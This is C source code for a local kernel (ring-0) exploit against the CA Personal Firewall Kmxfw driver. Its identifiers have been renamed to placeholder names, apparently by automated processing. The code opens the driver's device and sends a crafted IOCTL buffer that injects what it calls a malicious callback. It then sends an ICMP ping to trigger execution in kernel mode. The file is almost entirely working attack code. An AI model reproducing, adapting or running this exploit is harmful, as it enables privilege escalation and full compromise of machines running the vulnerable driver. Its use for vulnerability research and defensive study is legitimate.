
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int VOID ;
typedef int SendData ;
typedef int (* PIcmpSendEcho2 ) (scalar_t__,int *,int *,int *,int ,char*,int,int *,int *,int,int) ;
typedef scalar_t__ (* PIcmpCreateFile ) () ;
typedef int * LPVOID ;
typedef int ICMP_ECHO_REPLY ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;


 scalar_t__ FUNC_0 (char*,int ,int ,int *,int,int ,int ) ;
 int FUNC_1 (scalar_t__,int,int *,int,int *,int,int*,int *) ;
 scalar_t__ FUNC_2 (int ,char*) ;
 scalar_t__ VAR_0 ;
 int FUNC_3 (char*) ;
 scalar_t__ VAR_1 ;
 int FUNC_4 () ;
 int FUNC_5 (int) ;
 int FUNC_6 (char*) ;
 scalar_t__ FUNC_7 (int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (char*,char*) ;
 int FUNC_10 (char*) ;

int FUNC_11(int VAR_2, char *VAR_3[])
{

 DWORD *VAR_4,*VAR_5;
 DWORD VAR_6[4];
 DWORD VAR_7,VAR_8,VAR_9,VAR_10,VAR_11,VAR_12;
 HANDLE VAR_13;
 PIcmpSendEcho2 VAR_14;
 PIcmpCreateFile VAR_15;
 LPVOID VAR_16;
 HANDLE VAR_17;
 char *VAR_18 = "owned!";



 if(VAR_2<2)
 {
  FUNC_8("\nusage> exploit.exe  2K or XP\n");
  FUNC_5(1);
 }

 if(!FUNC_9(VAR_3[1],"2K"))
 {
  VAR_14 = (PIcmpSendEcho2)FUNC_2(FUNC_3("icmp.dll")
             ,"IcmpSendEcho2");
  VAR_15 = (PIcmpCreateFile)FUNC_2(FUNC_3("icmp.dll")
                                                  ,"IcmpCreateFile");
 }
 else
{
  VAR_14 = (PIcmpSendEcho2)FUNC_2(FUNC_3("iphlpapi.dll")
             ,"IcmpSendEcho2");
  VAR_15 = (PIcmpCreateFile)FUNC_2(FUNC_3("iphlpapi.dll")
                                                 ,"IcmpCreateFile");
}

FUNC_10("cls");
FUNC_8("############################\n");
FUNC_8("### CA Personal Firewall ###\n");
FUNC_8("##### - Ring0 Exploit - ####\n");
FUNC_8("############################\n");
FUNC_8("Ruben Santamarta\nwww.reversemode.com\n\n");




VAR_13 = FUNC_0("\\\\.\\Kmxfw",
                     0,
                     0,
                     ((void*)0),
                     3,
                     0,
                     0);





 if (VAR_13 == VAR_0) FUNC_4();
 FUNC_8("[!] Kmxfw Device Handle [%x]\n",VAR_13);




 VAR_8 = 0x44;

 VAR_4 = (DWORD *)FUNC_7(VAR_8);




 VAR_7 = 0x85000014;
 FUNC_8("[!] Injecting Malicious Callback\n",VAR_7);
 VAR_6[0]=0;
 VAR_6[1]=(DWORD)VAR_1;
 VAR_6[2]=0;

 VAR_4[0]=(DWORD)VAR_6;
 VAR_4[1]=(DWORD)VAR_6;
 VAR_4[2]=(DWORD)VAR_6;


 FUNC_1(VAR_13,
                 VAR_7,
                 (LPVOID)VAR_4,0x10,
                 (LPVOID)VAR_4,0x44,
                 &VAR_10,
                 ((void*)0));

 FUNC_8("[!] Pinging google\n\t->Executing Ring0 Function\n");
 VAR_17=VAR_15();
 VAR_16 = (VOID*) FUNC_7(sizeof(ICMP_ECHO_REPLY) + sizeof(VAR_18));
 VAR_14(VAR_17,
                    ((void*)0),
                    ((void*)0),
                    ((void*)0),
                    FUNC_6("66.102.9.99"),
                    VAR_18,
                    sizeof(VAR_18),
                    ((void*)0),
                    VAR_16,
                    8*sizeof(VAR_18) + sizeof(ICMP_ECHO_REPLY),
                    1000);


}
